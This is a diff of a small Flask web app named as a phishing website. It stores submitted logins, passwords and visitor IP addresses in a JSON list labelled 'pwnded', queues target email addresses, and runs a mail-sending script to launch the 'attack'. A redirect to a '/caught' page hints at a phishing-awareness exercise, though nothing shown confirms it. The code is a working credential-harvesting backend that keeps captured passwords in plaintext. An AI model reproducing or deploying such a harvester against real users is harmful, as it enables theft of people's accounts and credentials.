@@ -12,19 +12,17 @@ def hello_world():
         psw = req["password"]
         print(req)
         ip = request.environ['REMOTE_ADDR']
-        #with open('./data.txt','a') as myfile:
-         #   myfile.write(login + '\n')
-          #  myfile.write(psw + '\n')
-           # myfile.write(ip + '\n')
-        with open('./data.json') as f:
+        
+        with open('./phishing_website/data.json') as f:
             data = json.load(f)
             temp= data["pwnded"]
             new = {"login": login, 
             "psw": psw, 
             "ip":ip}
             temp.append(new)
-        with open('./data.json','w') as f:
+        with open('./phishing_website/data.json','w') as f:
             json.dump(data, f)
+        
 
         return redirect("/caught")
 
@@ -39,12 +37,17 @@ def add_mail():
     global attack_in_progress
     if request.method == "POST":
         req = request.form
-        print(req)
-        #subprocess.Popen("python3 ../send_mail.py", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-        os.system('python3 ../send_mail.py')
-        attack_in_progress = 1
+        #print(req['mail'])
+        subprocess.Popen("python3 ./send_mail.py", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        with open('./send_to.txt','a') as myfile:
+            attack_in_progress = 1
+            myfile.write(req['mail'] + '\n')
+            print(req['mail'])
+             #   subprocess.Popen("python3 ../send_mail.py", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            #os.system('python3 ./send_mail.py') 
+            print("sent")      
     if attack_in_progress == 1:
-        return render_template("progress.html")      
+        return redirect('/cont')      
     return render_template("addmail.html")
 
 @app.route("/cont/", methods = ["GET", "POST"])
@@ -54,13 +57,13 @@ def attack():
         req = request.form
         print(req)
         attack_in_progress = 0
-        return redirect('/result/')
+        return redirect('/result')
         
     return render_template("progress.html")
 
 @app.route("/result/", methods = ["GET", "POST"])
 def summery():
-    with open("./data.json") as f:
+    with open("./phishing_website/data.json") as f:
         data = json.load(f)
         temp = data["pwnded"]
         #print(temp)
